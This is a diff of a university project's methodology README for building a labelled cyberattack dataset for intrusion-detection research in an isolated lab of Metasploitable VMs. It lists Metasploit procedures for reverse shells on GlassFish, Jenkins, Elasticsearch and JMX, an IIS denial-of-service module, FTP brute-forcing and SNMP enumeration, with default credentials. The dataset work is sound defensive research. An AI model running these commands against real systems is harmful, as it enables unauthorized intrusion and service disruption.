@@ -1,4 +1,3 @@
-
 # General Info
 This project is focused on creation of a Cybersecurity Attacks Dataset which can later be used for IDS/IPS systems, ML or any other relevant purpose.
 
@@ -6,36 +5,32 @@ The idea is to have an isolated environment with intentionally vulnerable VM's a
 
 In the following sections there is information on the different aspects of this project, and all of that is for the purpose of constructing a Methodology for the entire process.
 
-`Prof note` - sections including what my Professors mentioned to take in mind
-`Here we would have` - sections including plan/ideas of what we are going to do / should do regarding that aspect 
+---
 # Scenario
 
-#### Prof note
- - VM
- - Container Images
- - CVE
-#### Here we would have:
+The scenario is having a controlled environment with vulnerable machines and attacker machines. 
+#### Vulnerable Machines
+
+Should have 7 of each.
+
 - Metasploitable 2 VMs
+	- Linux VMs
 - Metasploitable 3 VMs
-	- Ubuntu VMs
-		- Check if attacks on the Ubuntu VM are possible
 	- Windows VMs
-		- All attacks are performed on the Windows VM
 - SecGen Custom VMs - Still testing if possible
 - VulHub Docker Containers inside VMs
-#### To think about
-- Should we provide the attackers with Kali VMs or should they bring their own?
-	- If we provide them, we can preconfigure the VMs with the required tools, NTP config, etc.
+	- Recent vulnerabilities
+	- Will deploy different combinations of containers inside VMs
 
+The `Attacks` section is organized by type of vulnerable machine, providing detailed information on every vulnerability of each machine type.
+#### Attacker Machines
+
+Each attacker will be given a preconfigured Kali Linux VM inside the environment with all the tools and software needed. That adds up to 7 Kali Linux VMs.
+
+---
 # Monitoring
 
-#### Prof note
-- Netflow
-- Syslog
-- Raw Packet Capture
-- NTP (synchronize timestamps)
-
-#### Here we would have:
+The `Monitoring` section provides information on the monitoring of the environment, including raw packer capture, NTP synchronization, logging, and NetFlow data collection.
 
 ##### RAW Packet Capture
 - Still to be tested by Bidik's proposal - Waiting on it
@@ -72,23 +67,32 @@ In the following sections there is information on the different aspects of this 
 
 - Deployment scheme:
 	![NetFlow](img/NetFlow.drawio.png)
-# Attacks
-
-#### Prof note
- - List of attacks + variations
- - Procedure for conducting each attack
-#### Here we would have:
-- Done in separate markdowns in `/Exploits` - Work in progress
-
-## Status info
-
-- **success** - exploited successfully
-- **ran** - ran without errors but did not exploit
-- **error** - tool errored / attack did not run properly
 
 ---
+# Attacks
 
+The `Attacks` section explains each of the attacks that will be conducted by the attacker.
+It is organized in subsections for each vulnerable machine type.
+For each attack, we have: 
+- `attack_name` - unique identifier of an attack
+- `exploit_cve` - if present
+- `target_port` and `protocol`
+- detailed step-by-step instructions on how to conduct the attack
+	- provided specific commands
+	- provided variations of attacks that can be combined randomly
+- provided instructions on what to run on attack start and attack end
+
+After each conducted attack, we can have one of the 3 scenarios:
+- **success** - exploited successfully
+- **ran** - ran without errors but did not exploit (also used for scanning)
+- **error** - tool errored / attack did not run properly
+
+Here follows the attacks list.
+
+---
 ## Metasploitable 2
+
+note: More attacks will be added before the infrastructure is ready.
 
 ### 1. Unix R-Services Reverse Shell
 
@@ -336,13 +340,14 @@ attacklog end --status <success|ran|error>
 
 ## Metasploitable 3
 
+note: More attacks will be added before the infrastructure is ready.
 ### 9. GlassFish Reverse Shell
 
 **Name:** `ms3-glassfish-revshell`  
 **Target port:** 4848 / TCP
 
 ```bash
-attacklog start --name ms3-glassfish-revshell --dst-ip 10.10.10.16 --dst-port 4848
+attacklog start --name ms3-glassfish-revshell --dst-ip <dst-ip> --dst-port 4848
 ```
 
 Generate the payload:
@@ -361,7 +366,7 @@ set LPORT 4444
 run
 ```
 
-Upload via the GlassFish admin panel at `http://10.10.10.16:4848` (credentials: `admin / sploit`):
+Upload via the GlassFish admin panel at `http://<dst-ip>:4848` (credentials: `admin / sploit`):
 
 1. Left panel -> **Applications** -> **Deploy**
 2. Browse and select `shell.war` -> **OK**
@@ -369,7 +374,7 @@ Upload via the GlassFish admin panel at `http://10.10.10.16:4848` (credentials: 
 Trigger the shell:
 
 ```bash
-curl http://10.10.10.16:8080/shell/
+curl http://<dst-ip>:8080/shell/
 ```
 
 ```bash
@@ -384,12 +389,12 @@ attacklog end --status <success|ran|error>
 **Target port:** 8484 / TCP
 
 ```bash
-attacklog start --name ms3-jenkins-revshell --dst-ip 10.10.10.16 --dst-port 8484
+attacklog start --name ms3-jenkins-revshell --dst-ip <dst-ip> --dst-port 8484
 ```
 
 ```
 use exploit/multi/http/jenkins_script_console
-set RHOSTS 10.10.10.16
+set RHOSTS <dst-ip>
 set RPORT 8484
 set LHOST <your_ip>
 set LPORT 4447
@@ -410,12 +415,12 @@ attacklog end --status <success|ran|error>
 **Target port:** 80 / TCP
 
 ```bash
-attacklog start --name ms3-iis-http-dos --dst-ip 10.10.10.16 --dst-port 80
+attacklog start --name ms3-iis-http-dos --dst-ip <dst-ip> --dst-port 80
 ```
 
 ```
 use auxiliary/dos/http/ms15_034_ulonglongadd
-set RHOSTS 10.10.10.16
+set RHOSTS <dst-ip>
 set RPORT 80
 run
 ```
@@ -432,12 +437,12 @@ attacklog end --status <success|ran|error>
 **Target port:** 21 / TCP
 
 ```bash
-attacklog start --name ms3-iis-ftp-wordlist --dst-ip 10.10.10.16 --dst-port 21
+attacklog start --name ms3-iis-ftp-wordlist --dst-ip <dst-ip> --dst-port 21
 ```
 
 ```
 use auxiliary/scanner/ftp/ftp_login
-set RHOSTS 10.10.10.16
+set RHOSTS <dst-ip>
 set RPORT 21
 set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
@@ -457,12 +462,12 @@ attacklog end --status <success|ran|error>
 **Target port:** 9200 / TCP
 
 ```bash
-attacklog start --name ms3-elasticsearch-revshell --dst-ip 10.10.10.16 --dst-port 9200
+attacklog start --name ms3-elasticsearch-revshell --dst-ip <dst-ip> --dst-port 9200
 ```
 
 ```
 use exploit/multi/elasticsearch/script_mvel_rce
-set RHOSTS 10.10.10.16
+set RHOSTS <dst-ip>
 set RPORT 9200
 set LHOST <your_ip>
 set LPORT 4444
@@ -482,12 +487,12 @@ attacklog end --status <success|ran|error>
 **Target port:** 161 / UDP
 
 ```bash
-attacklog start --name ms3-snmp-enum --dst-ip 10.10.10.16 --dst-port 161 --protocol udp
+attacklog start --name ms3-snmp-enum --dst-ip <dst-ip> --dst-port 161 --protocol udp
 ```
 
 ```
 use auxiliary/scanner/snmp/snmp_enum
-set RHOSTS 10.10.10.16
+set RHOSTS <dst-ip>
 set RPORT 161
 set COMMUNITY public
 set VERSION 1
@@ -506,12 +511,12 @@ attacklog end --status <success|ran|error>
 **Target port:** 1617 / TCP
 
 ```bash
-attacklog start --name ms3-jmx-revshell --dst-ip 10.10.10.16 --dst-port 1617
+attacklog start --name ms3-jmx-revshell --dst-ip <dst-ip> --dst-port 1617
 ```
 
 ```
 use exploit/multi/misc/java_jmx_server
-set RHOSTS 10.10.10.16
+set RHOSTS <dst-ip>
 set RPORT 1617
 set LHOST <your_ip>
 set LPORT 4444
@@ -523,40 +528,29 @@ run
 attacklog end --status <success|ran|error>
 ```
 
-# Timing
+---
+## SecGen
 
-#### Prof note
- - How many days
- - Schedule of attack
- - Which should be conducted in parallel
- - Which should be conducted non-parallel (alone)
-#### Here we would have:
-- Will leave it for after the 'Attacks' section.
-# Benign Traffic - To discuss - Not relevant right now
+Still under testing phase.
 
+---
+## VulnHub
+
+More attacks will be added before the infrastructure is ready.
+
+https://github.com/vulhub/vulhub/tree/master/flask/ssti
+https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11978
+
+---
 # Automatic Labeling
 
-#### Prof note
-- What should each attacker keep track of, how, and where?
-#### Here we would have:
-- Each attacker should keep track of each action/step they take during the attack
-- We should have clear timestamps (from - to)
-- We should have clear note on which attack it is in the given timestamp
-- We should have clear note on source IP and source port(s), destination IP and destination port(s)
-- Attackers will be provided with VPN access to the controlled environment with each getting a static IP address, still they should state the source IP for each attack (or a dedicated kali vm inside the environment with a static ip - no need for VPN)
-- Each attacker will be assigned multiple attacks/exploits by random
-- For each attack, the attackers will be given markdown file with step-by-step instructions on how to perform the attack
-- For each attack, the attackers will be given an intentionally vulnerable VM IP address and port 
-	- Have in mind that a single VM can be used by many attackers and for exploiting many vulnerabilities (the exact deployment, number of machines and variants are not discussed in this section and will be defined later - not relevant for now)
-##### What is really important: What should each attacker keep track of, how, and where, in order for us to be easier later to conduct automatic labelling of the flows and raw packets using scripts
+The `Automatic Labeling` section is dedicated to the process of automatic labelling of flows and raw packet capture after conducting the attacks.
 
-##### Ideas
-- Provide attackers with preconfigured Kali VMs
-- Create a CLI tool that will be used for automatically take metrics on attack start/end
-- Maybe use Kafka integration for the CLI tool to automatically send the recorded attack data
+For the purpose of this, a CLI tool was created, called `attack_log` which is used on attack start and attack end to store necessary information regarding the attack.
 
-#### Here we would have:
+The tool is written in pure Python and it is very easy and intuitive to use. 
 
+##### The process will be conducted in the following manner:
 Each attacker runs the `attacklog` CLI tool (installed and initialized on their machine
 before the session begins) to bracket every attack with a start and end event.
 This produces a structured SQLite record per attack that can be joined against
@@ -605,14 +599,14 @@ entirely different ports.
 - Records are stored locally at `~/.attacklog/attacks.db` (SQLite)
 - Exported via `attacklog export --format json` or `--format csv` at the end
   of each session and submitted for post-processing
-- Kafka integration is deferred - to be discussed
+- Kafka integration can be later added - to be discussed
 
 ##### What is NOT recorded (by design)
-- Callback / reverse shell sessions (dst → src) - recoverable from PCAP
+- Callback / reverse shell sessions (dst → src) - maybe recoverable from PCAP if needed
 - CVE, tool, payload type - defined in the attack instruction files,
   joined by `attack_name` during post-processing; no manual entry needed
 
-## Tool configuration notes
+#### Tool configuration notes for environment setup
 
 Initialization
 ```
@@ -639,7 +633,6 @@ Export attacks data in json or csv
 python attacklog.py export --format <json/csv> --output <output_file>
 ```
 
-
 Add `attaclog` to PATH
 ```
 chmod +x attacklog.py
@@ -648,3 +641,5 @@ sudo mv attacklog.py /usr/local/bin/attacklog
 
 attacklog init --attacker-id attacker_<attacker_number> --src-ip <src_ip>
 ```
+
+---
